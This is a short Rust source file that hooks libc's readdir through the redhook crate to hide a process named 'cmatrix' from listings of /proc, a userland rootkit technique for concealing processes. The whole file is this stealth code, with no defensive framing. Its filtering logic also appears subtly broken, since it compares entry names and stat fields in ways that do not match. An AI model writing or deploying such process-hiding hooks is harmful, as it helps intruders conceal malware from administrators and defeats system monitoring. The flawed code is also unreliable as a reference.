extern crate libc;

#[macro_use]
extern crate redhook;

use libc::{dirent, DIR};

const PROC_NAME: &'static str = "cmatrix"; // Name of the process want to hide.

fn check_process(dir_name: String) -> bool {
    if let Ok(name) = std::fs::read_to_string(dir_name).map(|n| String::from(n.split(' ').nth(1).unwrap_or(""))) {
        return &name == PROC_NAME
    }
    false 
}

hook! {
    unsafe fn readdir(dirp: *mut DIR) -> *mut dirent => hide_readdir {
        loop {
            let d = real!(readdir)(dirp);
            if !d.is_null() {
                let name = String::from_utf8(Vec::from((*d).d_name).iter().map(|c| *c as u8).collect());
                if let Err(_) = name { continue }
                let name = name.unwrap();
                
                if name.starts_with("/proc") && check_process(name) {
                    continue
                }
            }
            return d;
        }
    }
}
